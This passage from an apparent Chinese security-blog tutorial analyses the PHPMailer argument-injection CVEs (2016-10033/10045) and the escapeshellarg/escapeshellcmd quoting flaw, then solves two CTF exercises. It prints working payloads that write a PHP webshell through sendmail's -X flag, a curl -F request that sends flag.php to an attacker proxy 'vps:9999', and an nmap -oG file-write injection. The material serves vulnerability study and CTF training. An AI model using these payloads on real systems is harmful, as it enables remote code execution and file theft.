<p>这里<code>$param</code>作为<code>mail</code>的第五个参数，该参数用于指定<code>sendmail</code>的额外参数，其中<code>sendmail</code>的<code>-X</code>参数会将流量记录到文件中从而写文件实现 RCE，进一步跟跟进 <strong>$params</strong> 参数，看看它是怎么来的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mailSend</span>(<span class="params">$header, $body</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $toArr = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;to <span class="keyword">as</span> $toaddr) &#123;</span><br><span class="line">            $toArr[] = <span class="keyword">$this</span>-&gt;addrFormat($toaddr);</span><br><span class="line">        &#125;</span><br><span class="line">        $to = implode(<span class="string">&#x27;, &#x27;</span>, $toArr);</span><br><span class="line"></span><br><span class="line">        $params = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//This sets the SMTP envelope sender which gets turned into a return-path header by the receiver</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">            $params = sprintf(<span class="string">&#x27;-f%s&#x27;</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;Sender != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> !ini_get(<span class="string">&#x27;safe_mode&#x27;</span>)) &#123;</span><br><span class="line">            $old_from = ini_get(<span class="string">&#x27;sendmail_from&#x27;</span>);</span><br><span class="line">            ini_set(<span class="string">&#x27;sendmail_from&#x27;</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;SingleTo <span class="keyword">and</span> count($toArr) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($toArr <span class="keyword">as</span> $toAddr) &#123;</span><br><span class="line">                $result = <span class="keyword">$this</span>-&gt;mailPassthru($toAddr, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">array</span>($toAddr), <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;mailPassthru($to, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">$this</span>-&gt;to, <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($old_from)) &#123;</span><br><span class="line">            ini_set(<span class="string">&#x27;sendmail_from&#x27;</span>, $old_from);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException(<span class="keyword">$this</span>-&gt;lang(<span class="string">&#x27;instantiate&#x27;</span>), <span class="built_in">self</span>::STOP_CRITICAL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>重点关注第12行，很明显 <strong>$params</strong> 是从 <strong>$this-&gt;Sender</strong> 传进来的，我们找一下 <strong>$this-&gt;Sender</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFrom</span>(<span class="params">$address, $name = <span class="string">&#x27;&#x27;</span>, $auto = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $address = trim($address);</span><br><span class="line">        $name = trim(preg_replace(<span class="string">&#x27;/[\r\n]+/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name)); <span class="comment">//Strip breaks and trim</span></span><br><span class="line">        <span class="comment">// Don&#x27;t validate now addresses with IDN. Will be done in send().</span></span><br><span class="line">        <span class="keyword">if</span> (($pos = strrpos($address, <span class="string">&#x27;@&#x27;</span>)) === <span class="literal">false</span> <span class="keyword">or</span></span><br><span class="line">            (!<span class="keyword">$this</span>-&gt;has8bitChars(substr($address, ++$pos)) <span class="keyword">or</span> !<span class="keyword">$this</span>-&gt;idnSupported()) <span class="keyword">and</span></span><br><span class="line">            !<span class="keyword">$this</span>-&gt;validateAddress($address)) &#123;</span><br><span class="line">            $error_message = <span class="keyword">$this</span>-&gt;lang(<span class="string">&#x27;invalid_address&#x27;</span>) . <span class="string">&quot; (setFrom) <span class="subst">$address</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setError($error_message);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;edebug($error_message);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException($error_message);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;From = $address;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;FromName = $name;</span><br><span class="line">        <span class="keyword">if</span> ($auto) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;Sender = $address;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>将 <strong>$address</strong> 经过某些处理之后赋值给 <strong>$this-&gt;Sender</strong>，继续追踪<code>validateAddress</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAddress</span>(<span class="params">$address, $patternselect = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($patternselect)) &#123;</span><br><span class="line">            $patternselect = <span class="built_in">self</span>::$validator;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($patternselect)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func($patternselect, $address);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Reject line breaks in addresses; it&#x27;s valid RFC5322, but not RFC5321</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($address, <span class="string">&quot;\n&quot;</span>) !== <span class="literal">false</span> <span class="keyword">or</span> strpos($address, <span class="string">&quot;\r&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$patternselect <span class="keyword">or</span> $patternselect == <span class="string">&#x27;auto&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span></span><br><span class="line">            <span class="comment">//Constant was added in PHP 5.2.4</span></span><br><span class="line">            <span class="keyword">if</span> (defined(<span class="string">&#x27;PCRE_VERSION&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span></span><br><span class="line">                <span class="keyword">if</span> (version_compare(PCRE_VERSION, <span class="string">&#x27;8.0.3&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    $patternselect = <span class="string">&#x27;pcre8&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $patternselect = <span class="string">&#x27;pcre&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">&#x27;extension_loaded&#x27;</span>) <span class="keyword">and</span> extension_loaded(<span class="string">&#x27;pcre&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">//Fall back to older PCRE</span></span><br><span class="line">                $patternselect = <span class="string">&#x27;pcre&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span></span><br><span class="line">                <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">&#x27;5.2.0&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    $patternselect = <span class="string">&#x27;php&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $patternselect = <span class="string">&#x27;noregex&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> ($patternselect) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;pcre8&#x27;</span>:</span><br><span class="line">                ......</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;pcre&#x27;</span>:</span><br><span class="line">                ......</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;html5&#x27;</span>:</span><br><span class="line">                ......</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;noregex&#x27;</span>:</span><br><span class="line">                <span class="comment">//No PCRE! Do something _very_ approximate!</span></span><br><span class="line">                <span class="comment">//Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char</span></span><br><span class="line">                <span class="keyword">return</span> (strlen($address) &gt;= <span class="number">3</span></span><br><span class="line">                    <span class="keyword">and</span> strpos($address, <span class="string">&#x27;@&#x27;</span>) &gt;= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">and</span> strpos($address, <span class="string">&#x27;@&#x27;</span>) != strlen($address) - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)filter_var($address, FILTER_VALIDATE_EMAIL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的大概流程就是：</p>
<ol>
<li>默认patternselect==‘auto’，它会自动选择一个方式对email进行检测</li>
<li>如果php支持正则PCRE（也就是包含<code>preg_replace</code>函数），就用正则的方式来检查，就是那一大串很难读懂的正则</li>
<li>如果php不支持PCRE，且PHP版本大于PHP5.2.0，就是用PHP自带的filter来检查email</li>
<li>如果php不支持PCRE，且PHP版本低于PHP5.2.0，就直接检查email中是否包含@</li>
</ol>
<p>如果是第四种情况的话，这个时候该函数会使用<code>noregex</code>的方式，即只需满足三个条件即可通过过滤：</p>
<ul>
<li>输入长度大于 3</li>
<li>含有<code>@</code></li>
<li><code>@</code>不是最后一个字符</li>
</ul>
<p>这三个条件比较容易满足，也有复现环境和Poc：<a href="https://github.com/opsxcq/exploit-CVE-2016-10033">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p>
<p>但是满足这个情况的主机现在已经很少了，正常情况下都是使用<code>pcre8</code>的正则来进行过滤，所以如果要扩大攻击面需要对正则进行绕过，并且还得让 sendmail 成功执行。</p>
<p>有几种payload可以绕过那些看着头大的正则表达式：</p>
<blockquote>
<p>正则表达式分析： <a href="https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html">https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&lt;?system($_GET[&#39;pew&#39;]);?&gt;&quot;. -OQueueDirectory&#x3D;&#x2F;tmp&#x2F;. -X.&#x2F;images&#x2F;zwned.php @swehack.org</span><br></pre></td></tr></table></figure>
<p>这里使用<code>.%20</code>（点+空格）来作为分隔符，实际测试一下，已经写入了shell.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616162846.png" alt=""></p>
<p>访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;1.php?x&#x3D;%22%3C?system($_GET[%27x%27]);?%3E%22.%20-OQueueDirectory&#x3D;&#x2F;tmp&#x2F;.%20-X&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php%20@a.com</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616162748.png" alt=""></p>
<p>P牛的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaa( -X&#x2F;home&#x2F;www&#x2F;success.php -OQueueDirectory&#x3D;&#x2F;tmp )@qq.com</span><br></pre></td></tr></table></figure>
<h3 id="CVE-2016-10045">CVE-2016-10045</h3>
<p>Seebug文章：<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
<h4 id="环境搭建-v2">环境搭建</h4>
<p>和上面的一样，就是把源代码换成5.2.20版本</p>
<h4 id="漏洞原理-v2">漏洞原理</h4>
<p>首先看补丁：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616150310.png" alt=""></p>
<p>针对用户输入使用 <strong>escapeshellarg</strong> 函数进行处理。所以，在最新版本中使用之前的 payload 进行攻击会失败，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br></pre></td></tr></table></figure>
<p>但是，却可以使用下面这个 <strong>payload</strong> 进行攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39;( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br></pre></td></tr></table></figure>
<p>实际上，可用于攻击的代码只是在之前的基础上多了一个单引号。之所以这次的攻击代码能够成功，是因为修复代码多了 <strong>escapeshellcmd</strong> 函数，结合上 <strong>mail()</strong> 函数底层调用的 <strong>escapeshellarg</strong> 函数，最终导致单引号逃逸。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">&quot;a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/shell.php )@qq.com&quot;</span>;</span><br><span class="line">$earg = escapeshellarg($payload);</span><br><span class="line">var_dump($earg);</span><br><span class="line">$ecmd = escapeshellcmd($earg);</span><br><span class="line">var_dump($ecmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616173341.png" alt=""></p>
<p>我们的 payload 最终在执行时变成了<code>'-fa'\\''\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\'</code>，分割后就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com'</code>，最终的参数就是这样被注入的。</p>
<h2 id="0x03-练习题">0x03 练习题</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,$key))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;are you a hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">    <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line"><span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $_GET[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">&#x27;flag&#x27;</span>] ) == md5($_GET[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        $urlInfo = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === strtolower($urlInfo[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===strtolower($urlInfo[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $url = escapeshellarg($url);</span><br><span class="line">        $url = escapeshellcmd($url);</span><br><span class="line">        system(<span class="string">&quot;curl &quot;</span>.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;HRCTF&#123;Are_y0u_maz1ng&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="考点一">考点一</h3>
<blockquote>
<p>这里涉及到可变变量的概念</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">    <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先循环获取超全局变量<code>_POST</code>、<code>_GET</code>、<code>_COOKIE</code>，并依次赋值给<code>$__R</code>。再第二行判断<code>$$__R</code>是否存在，如果存在的话，那么继续判断<code>_POST</code>、<code>_GET</code>、<code>_COOKIE</code>中是否存在键值相等的，如果相等则删除变量。</p>
<p>假如我们通过GET提交<code>flag=ca01h</code>，接着通过POST提交<code>_GET[flag]=ca01h</code>。那么遍历<code>$_POST</code> 超全局数组的时候，<code>$__key</code>就等于<code>_GET[flag]</code>，<code>$__v</code>就等于<code>ca01h</code>，所以<code>$$__key</code>等于<code>$_GET[flag]</code>，即ca01h，此时<code>$$__k==$__v</code>成立，变量<code>$_GET[flag]</code>就被释放了。接着如果这些超全局变量存在的话，对它们的键名进行一个waf过滤，但是在 第21行 和 22行 有这样一串代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure>
<p><code>extract</code>是变量覆盖常用的函数，作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值，<strong>EXTR_SKIP</strong> 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 POST 请求提交 <code>_GET[flag]=test</code> ，所以这里会变成 <code>$_GET[flag]=test</code> ，这里的<code>$_GET</code>变量就不需要再经过 waf 函数检测了，也就绕过了<code>preg_match(‘/flag/i’,$key)</code>的限制。</p>
<h3 id="考点二">考点二</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $_GET[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">&#x27;flag&#x27;</span>] ) == md5($_GET[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        $urlInfo = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === strtolower($urlInfo[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===strtolower($urlInfo[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $url = escapeshellarg($url);</span><br><span class="line">        $url = escapeshellcmd($url);</span><br><span class="line">        system(<span class="string">&quot;curl &quot;</span>.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二行和第五行的两个<code>if</code>语句用md5碰撞就可以绕过，接下来主要考察curl读取文件。</p>
<p>在 curl 中存在 -F 提交表单的方法，可以提交文件。<code> -F &lt;key=value&gt;</code> 向服务器POST表单，例如： <code>curl -F “web=@index.html;type=text/html” url.com</code> 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的的影响。</p>
<p>这里的 <strong>第11行</strong> 和 <strong>第12行</strong> 增加了两个过滤，参照上面的知识点绕过。</p>
<p>所以这题最后的 <strong>payload</strong> ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?flag&#x3D;QNKCDZO&amp;hongri&#x3D;s878926199a&amp;url&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;&#39; -F file&#x3D;@&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php -x  vps:9999</span><br></pre></td></tr></table></figure>
<p>POST：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_GET[flag]&#x3D;QNKCDZO&amp;_GET[hongri]&#x3D;s878926199a&amp;_GET[url]&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;&#39; -F file&#x3D;@&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php -x  vps:9999</span><br></pre></td></tr></table></figure>
<h2 id="0x04-附加练习题">0x04 附加练习题</h2>
<p>题目地址：[BUU2018 Online Tool](<a href="https://buuoj.cn/challenges#">https://buuoj.cn/challenges#</a>[BUUCTF 2018]Online Tool)</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后一行代码是执行一个系统命令，而且有传参，肯定是利用这里了。这里常见的命令后注入操作如<code> | &amp; &amp;&amp;</code>都不行，<code>escapeshellcmd</code>会对这些特殊符号前面加上<code>\</code>来转义。</p>
<p>那么就应该想想怎么利用nmap来做些什么。</p>
<blockquote>
<p>nmap命令中 有一个参数-oG或者-oN可以实现将命令和结果写到文件</p>
</blockquote>
<p>接下来考虑两个函数的效果，测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">&quot;&#x27; &lt;?php phpinfo;?&gt; -oG shell.php &#x27;&quot;</span>;</span><br><span class="line">$host = (<span class="keyword">string</span>)$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;host:&quot;</span>.$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$arg = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;arg:&quot;</span>.$arg;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$cmd = escapeshellcmd($arg);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;cmd:&quot;</span>.$cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出\：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host:&#39; &lt;?php phpinfo;?&gt; -oG shell.php &#39;&lt;&#x2F;br&gt;</span><br><span class="line">arg:&#39;&#39;\&#39;&#39; &lt;?php phpinfo;?&gt; -oG shell.php &#39;\&#39;&#39;&#39;&lt;&#x2F;br&gt;</span><br><span class="line">cmd:&#39;&#39;\\&#39;&#39; \&lt;\?php phpinfo\;\?\&gt; -oG shell.php &#39;\\&#39;&#39;&#39;&lt;&#x2F;br&gt;</span><br></pre></td></tr></table></figure>
<p><code>escapeshellarg</code>会先对单引号转义，此时的结果应该是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\&#39;-oG &lt;?php phpinfo();?&gt; -oG shell.php \&#39;</span><br></pre></td></tr></table></figure>
<p>然后对<code>\</code>分割的每个部分加上单引号，并连接，结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;\&#39;&#39;-oG &lt;?php phpinfo();?&gt; -oG shell.php &#39;\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>之后，进行了<code>escapeshellcmd</code>，会对上边提到的字符进行转义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;\\&#39;&#39;\&lt;\?php phpinfo\(\)\;\?\&gt; -oG shell.php &#39;\\&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>带入到命令行执行的结果就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ &lt;?php phpinfo();?&gt; -oG shell.php \\</span><br></pre></td></tr></table></figure>
